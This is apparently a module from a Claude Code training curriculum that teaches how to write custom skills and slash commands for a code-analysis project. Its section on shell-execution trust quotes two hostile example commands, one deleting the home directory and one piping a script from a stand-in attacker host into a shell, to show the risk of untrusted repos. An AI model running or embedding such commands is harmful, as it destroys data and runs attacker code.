# Module 4 -- Skills & Commands

<!-- progress:start -->
**Progress:** Module 4 of 10 `[████░░░░░░]` 40%

**Estimated time:** ~45-60 min
<!-- progress:end -->

<details>
<summary>What you’ll use in this module</summary>

**CC features:** SKILL.md, frontmatter, custom slash commands, hot-reload, argument substitution, disable-model-invocation

**Persona -- Collaborator:** Ask before telling, give pointers not answers. "What do you think…", "Try this and tell me…"

</details>

In this module you create reusable skills that extend what Claude can do in your project.

> **New terms this module uses:**
> - **Skill (Claude Code)** -- a reusable prompt saved as a Markdown file in `.claude/skills/`. You invoke it with a slash command like `/new-page`. Different from "skill" in the general sense -- this is specifically the Claude Code feature.
> - **SKILL.md** -- the Markdown file that defines a skill. Its frontmatter (the `---` block at the top) names the skill and sets options; the body is the prompt Claude runs when you invoke it.
> - **Argument substitution (`$ARGUMENTS`)** -- a placeholder in a skill's body that gets replaced with whatever text you type after the slash command. Like a function parameter.
>
> See the [glossary](../../../GLOSSARY.md) for related terms.

**What's the difference between a skill and a command?**

- A **command** is anything you invoke by typing `/name` in Claude Code. Built-ins like `/init`, `/memory`, `/compact` are commands.
- A **skill** is a *user-defined command* -- a Markdown file you put in `.claude/skills/` that becomes a new `/command`. Skills let you package your own prompts, rules, and tool allowlists as first-class commands.
- **All skills are commands; not all commands are skills.** The module title "Skills & Commands" means "the skill system, which is how you add new commands."

### 4.1 Create the "analyze" skill

**Where do skills go?** Where Claude is running from determines which `.claude/skills/` wins — specifically, the directory Claude has as `$CLAUDE_PROJECT_DIR`. If you launch `claude` from the cc-self-train root, skills in `cc-self-train/.claude/skills/` are visible; if you launch from `workspace/sentinel-analyzer/`, skills in `workspace/sentinel-analyzer/.claude/skills/` are visible instead.

**For this curriculum:** we stay at the cc-self-train root, so put skills in `cc-self-train/.claude/skills/` — NOT inside `workspace/sentinel-analyzer/.claude/skills/`.

**For normal project use** (after you graduate from this curriculum): skills belong in your own project's `.claude/skills/`. That's where your team expects them.

**Why this step:** Skills turn multi-step workflows into single slash commands. Instead of typing a long prompt every time you want to analyze code, you type `/analyze src/` and Claude follows the same steps every time. Skills are reusable, shareable, and version-controlled -- they become part of your project's toolbox.

Ask Claude to create an `/analyze` skill. Describe what you want it to do: run Sentinel's scan on a given path, summarize findings by severity, highlight errors first, and suggest fixes for the top issues. Tell Claude it should accept a path argument so you can run `/analyze src/` or `/analyze src/rules/`.

Try something like:

```
Create a skill at .claude/skills/analyze/SKILL.md. It should run Sentinel analysis on whatever path I give it, summarize findings by severity, show errors first, and suggest fixes. It should accept a path argument using $ARGUMENTS.
```

Claude will create the SKILL.md file with frontmatter (name, description, argument-hint) and the skill body. Review it and tweak the steps if you want a different workflow.

Test it:

```
/analyze src/
```

**STOP -- What you just did:** You created your first custom skill and tested it with a path argument. The `$ARGUMENTS` placeholder captured everything after `/analyze`, so `/analyze src/` passed `src/` to the skill. This is the foundation -- you will build several more skills that become your daily shortcuts for working with Sentinel.

**Engineering value:**
- *Entry-level:* Skills turn multi-step prompts into one-word commands. Instead of explaining 'create a new page with the nav and footer and...' every time, you type `/new-page faq`.
- *Mid-level:* Skills are how you enforce team consistency. A `/new-component` skill ensures every component follows the same structure, naming, and testing pattern — no matter who creates it.
- *Senior+:* Skills are essentially codified workflows — the same concept as project templates, Yeoman generators, or `rails generate`, but defined in natural language and version-controlled with your project.

Ready to create the generate-tests skill?

### 4.2 Create the "generate-tests" skill

Ask Claude to create a `/generate-tests` skill. This one should analyze a source file, identify all public functions, and generate comprehensive tests covering happy paths, edge cases, and error cases. Tell Claude you want this skill to use `context: fork` so it runs in a separate subagent and keeps your main conversation clean.

Try something like:

```
Create a skill at .claude/skills/generate-tests/SKILL.md. It should take a source file path, find all public functions, generate tests for happy paths, edge cases, and error cases, then run them. Use `context: fork` in the frontmatter so it runs in a subagent.
```

**Why this step:** Notice `context: fork` in the frontmatter -- this skill runs in a separate subagent so test generation output does not clutter your main conversation. Forked context is ideal for verbose operations where you want the result but not the noise.

Test it by pointing it at one of your rule modules:

```
/generate-tests src/rules/complexity.py
```

(Replace with the actual path to one of your rule modules.)

### 4.3 Create the "quality-report" skill

Ask Claude to create a `/quality-report` skill. This one should run a full scan, collect findings by category and severity, calculate summary stats, and save a report to the `reports/` directory. Tell Claude to include `disable-model-invocation: true` in the frontmatter so this skill only runs when you explicitly type the command.

Try something like:

```
Create a skill at .claude/skills/quality-report/SKILL.md. It should run a full scan, summarize findings by category and severity, save a timestamped report to reports/, and support a format argument for text, JSON, or HTML. Set `disable-model-invocation: true` so it only runs when I call it explicitly.
```

Notice `disable-model-invocation: true` -- this skill only runs when you explicitly type `/quality-report`. Claude will not trigger it automatically.

**STOP -- What you just did:** You created three skills with different behaviors: `/analyze` runs in your main conversation, `/generate-tests` forks into a subagent, and `/quality-report` uses `disable-model-invocation: true` so it only runs when you explicitly call it. These three patterns cover most skill use cases you will encounter.

**Engineering value:**
- *Entry-level:* `disable-model-invocation` is your safety switch — it means this skill only runs when YOU ask for it, never automatically.
- *Mid-level:* In production repos, you'll want destructive or expensive operations (database resets, deployment scripts, full test suites) as manual-only skills. This prevents accidental execution during normal conversation.

**Quick check before continuing:**
- [ ] `/analyze src/` runs and produces output
- [ ] `/generate-tests` runs in a forked context (you should see subagent output)
- [ ] `/quality-report` exists with disable-model-invocation: true

### 4.3b Exit and Resume

New skills don't appear in `/` autocomplete until you restart the session. This is a perfect time to learn how to exit and pick up where you left off.

Exit Claude Code:

```
/exit
```

Now resume your session:

```
claude --resume
```

Claude picks up right where you left off -- your conversation history, CLAUDE.md, and rules are all still loaded. Type `/` and you should see your new skills (`analyze`, `generate-tests`, `quality-report`) in the autocomplete list.

**STOP -- What you just did:** You learned how to exit and resume a Claude Code session. The `--resume` flag restores your full conversation context, so you never lose progress. This is essential whenever you need to restart -- whether for new skills to appear, to free up memory, or just to take a break.

### 4.4 Use Custom Slash Commands With Arguments

Test argument substitution:

```
/analyze src/rules/
```

```
/generate-tests src/scanner.py
```

```
/quality-report --format json
```

The `$ARGUMENTS` placeholder captures everything after the skill name. You can also use positional arguments like `$0`, `$1` for more structured inputs.

### 4.5 Hot-Reload Skills

**Why this step:** Hot-reload means you can iterate on skills without restarting Claude Code. This makes skill development fast -- edit, test, edit, test -- just like editing code with a live-reloading server.

Edit one of your SKILL.md files (add a new step or change the description). You do not need to restart Claude Code -- skills are reloaded when invoked. Test by modifying the analyze skill and running `/analyze src/` again.

### 4.6 Create a No-AI Skill

Ask Claude to create a no-AI skill that just runs a shell command. This one should list all available analysis rules by executing `sentinel rules list` -- no AI processing needed.

Try something like:

```
Create a skill at .claude/skills/list-rules/SKILL.md that just runs `!sentinel rules list`. Set `disable-model-invocation: true` since it doesn't need AI.
```

This skill just executes a shell command. No AI processing needed. Test it:

```
/list-rules
```

**STOP -- What you just did:** You built a no-AI skill -- a slash command that runs a shell command directly without invoking the model. This is useful for quick reference commands where you do not need Claude to interpret the output. Between `/analyze`, `/generate-tests`, `/quality-report`, and `/list-rules`, you now have a custom command palette tailored to Sentinel. In real projects, you will accumulate skills like these over time until your most common workflows are all one-command operations.

### 4.7 Skill Frontmatter & Built-in Skills

A few skill authoring features have landed recently. What do you think each one is useful for?

**`effort` frontmatter.** Add `effort: low` (or `medium`/`high`) to a skill's frontmatter to override the model effort level when that skill is invoked. Try adding it to one of your skills -- when would you want a skill to force low effort? (v2.1.80)

**`${CLAUDE_SKILL_DIR}`.** This variable resolves to the skill's own directory. Use it in SKILL.md to reference sibling files -- for example, `Read ${CLAUDE_SKILL_DIR}/template.txt`. Check the skills docs if you want the full variable reference (v2.1.69).

**`/claude-api` bundled skill.** Claude Code ships with a built-in skill for building apps with the Claude API. It triggers automatically when your code imports `anthropic` or `@anthropic-ai/sdk`. Try typing `/claude-api` to see what it offers (v2.1.69).

- **Description cap raised to 1,536 characters** (v2.1.105). Skill descriptions used to be limited to 250 characters -- now you can write longer descriptions to help Claude understand when to trigger the skill. Descriptions exceeding 1,536 characters are truncated with a startup warning.
- **Built-in slash commands are now discoverable via the Skill tool** (v2.1.108). The model can invoke built-in commands like `/init`, `/review`, and `/security-review` without needing a SKILL.md file -- they are registered as built-in skills.

Try adding `effort: low` to one of your existing skills and invoking it -- does the response feel different?

> **STOP** -- Experiment with `effort` frontmatter and `${CLAUDE_SKILL_DIR}` in one of your skills.

### 4.10 Skill Scoping & Shell Execution Control

Two new skill features have landed that give you more control over when and how skills run.

**`paths:` frontmatter for skills.** Just like rules (Module 3), skills can now accept `paths:` as a YAML list of globs. Try adding it to one of your existing skills -- for example, scope the analyze skill so it only activates when you're working in the src/rules directory.

**`disableSkillShellExecution` — a trust boundary, not a preference.**

A cloned repo's `SKILL.md` can contain shell commands that run when the skill is invoked. That's powerful for workflows like `/run-tests` or `/deploy-preview` — but a hostile repo can ship a SKILL.md with `! rm -rf $HOME` or `! curl attacker.example/x | sh` and wait for you to invoke the skill. Nothing about the skill's name tells you what it will execute.

Set `"disableSkillShellExecution": true` in settings.json to stop skills from running shell commands entirely. Skills can still generate and edit files, just not execute arbitrary code. Treat this as a **trust boundary** rather than a preference:

- **Default to enabling it** when working with repos you haven't fully audited. Cost is minimal (you can still use skills for templates and file scaffolding); benefit is you can't be owned by a SKILL.md you didn't read.
- **Disable only for repos where you've read every SKILL.md.** Your own projects, vetted team repos, curated open source.
- See also: the Hook Trust Model section in Module 5 — same principle for `.claude/settings.json` hooks, which run on every session rather than on skill invocation.

Try both: add `paths:` to an existing skill, then toggle `disableSkillShellExecution` and invoke a skill that uses Bash to see what happens.

> **STOP** -- Test `paths:` scoping on a skill and observe what `disableSkillShellExecution` does.

### Choose Your Battles

You've just learned how to build skills. Resist the urge to make one for every workflow you have. A new skill has a maintenance cost -- you will forget what arguments it takes, how it fails, and what state it assumes.

**Rule of thumb:** Start with **2-3 skills** for workflows you do at least weekly. Add more only when a real, repeated friction appears. Delete skills you haven't invoked in a month.

For Sentinel, plausible candidates include:

- `/analyze` -- run analysis on a file or directory and summarize findings
- `/scan-repo` -- full-repo sweep with severity-grouped output
- `/test-gen` -- generate test stubs for uncovered functions

Pick two or three (or substitute your own). Everything else can wait.

### Checkpoint

You just built your own commands. Running analysis and generating tests is now one slash command away.

- [ ] Tested `paths:` on a skill and `disableSkillShellExecution`
- [ ] `/analyze` skill exists and works with path arguments
- [ ] `/generate-tests` skill exists, runs in a forked context, and produces tests
- [ ] `/quality-report` skill exists with disable-model-invocation: true
- [ ] You tested argument substitution ($ARGUMENTS) in at least one skill
- [ ] You edited a skill and saw hot-reload work without restarting
- [ ] `/list-rules` works as a no-AI skill
- [ ] Tested `effort` frontmatter and `${CLAUDE_SKILL_DIR}` in a skill
